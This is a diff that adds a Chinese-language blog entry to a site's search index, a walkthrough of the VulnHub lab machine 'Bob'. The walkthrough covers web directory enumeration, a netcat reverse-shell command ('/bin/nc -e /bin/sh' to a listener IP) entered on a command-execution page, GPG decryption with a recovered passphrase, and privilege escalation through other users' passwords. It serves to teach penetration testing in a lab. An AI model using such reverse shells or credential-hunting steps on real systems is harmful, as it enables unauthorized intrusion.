@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>vulnhub-Bob</title>
+      <link href="/2020/11/27/vulnhub-Bob/"/>
+      <url>/2020/11/27/vulnhub-Bob/</url>
+      
+        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2020/11/27/vulnhub-Bob/1.png" alt><br>靶机开放了80和21端口（我全程下来都没有利用过这个端口），打开80界面发现就一张图片，其余什么也没有，<br><img src="/2020/11/27/vulnhub-Bob/2.png" alt><br>所以就dirb一下网站的文件目录<br><img src="/2020/11/27/vulnhub-Bob/3.png" alt><br>发现了敏感文件robots.txt，访问发现是四个页面，逐一访问在/dev_shell.php页面发现了一些有用的东西<br><img src="/2020/11/27/vulnhub-Bob/4.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>我们发现/dev_shell.php是一个命令执行的页面，所以这就就是我们拿到shell的一个点，在这里我利用了普通的反弹shell，发现并没有什么用，所以就去看了别人的wp，发现这里对我们输入语句做了比较严格的限制，找了半天找到了一个能用到的反弹shell语句</p><pre class=" language-shell"><code class="language-shell">/bin/nc -e /bin/sh 192.168.10.207 7744    //反弹shell语句</code></pre><p>kali监听端口之后就到了我们接下来的提权阶段<br><img src="/2020/11/27/vulnhub-Bob/5.png" alt><br><img src="/2020/11/27/vulnhub-Bob/6.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>我们暂时的用户为www-data，su一下发现并没有什么可提权的点，系统版本也找不到相关的漏洞，直接去根目录下看看发现了flag.txt文件，但是我们没有权限（很肏），所以就去别的用户目录下看看有没有什么可以利用的信息，这里我们可以联想一下最初的时候web页面的介绍，提示我们注意Documents，所以就看一下每个用户的Documents目录，在bob用户的Documents目录看到了一些我们感兴趣的东西。<br><img src="/2020/11/27/vulnhub-Bob/7.png" alt><br>这里的login.txt.gpg文件我在开始做的时候觉得很奇怪，在我双看了别人的wp之后发现此文件是一个被加密过的文件，但是我们没有密码，翻了一下staff.txt文件，看了看之后发没觉得有什么发现，然后使劲翻Secret文件终于发现了一个有用的东西<br><img src="/2020/11/27/vulnhub-Bob/8.png" alt><br>起先我没看懂这是什么，所以就叒看了别人的wp，发现这是一个藏头诗，将头部聚集起来就是harpocrates的大写，也就是我们之前看到的被加密过的文件的密码，本来我挺高兴的去解密结果发现自己不会解密命令，所以就叕去看了别人的wp，解密命令如下</p><pre class=" language-shell"><code class="language-shell">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</code></pre><p>但是我们没有权限（很肏），<br><img src="/2020/11/27/vulnhub-Bob/12.png" alt><br>于是就只能到其他用户目录下看看有没有能用的信息，然后我们在elliot目录下发现了一个文档<br><img src="/2020/11/27/vulnhub-Bob/9.png" alt><br>发现了james的密码，su一下（james的用户名叫jc），只时候我们再到bob的Documents目录下看看能不能解密刚才那个文件，发现成功<br><img src="/2020/11/27/vulnhub-Bob/10.png" alt><br>发现了bob用户的密码，直接su一手，只时候我想到了那个在根目录下的flag.txt文件，看一看这次有没有权限打开，最后成功拿到flag（我也不知道为什么要用sudo命令）<br><img src="/2020/11/27/vulnhub-Bob/11.png" alt></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web基础 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vulnhub-Lampiao</title>
       <link href="/2020/11/25/vulnhub-Lampiao/"/>
       <url>/2020/11/25/vulnhub-Lampiao/</url>
